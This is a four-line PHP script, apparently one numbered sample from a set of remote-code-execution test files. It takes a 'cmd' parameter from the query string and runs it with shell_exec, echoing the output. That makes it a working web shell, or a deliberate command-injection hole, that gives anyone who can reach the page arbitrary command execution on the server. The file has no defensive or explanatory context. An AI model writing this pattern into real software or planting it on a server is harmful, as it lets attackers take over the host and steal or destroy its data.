<?php
// RCE test variation #1093
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>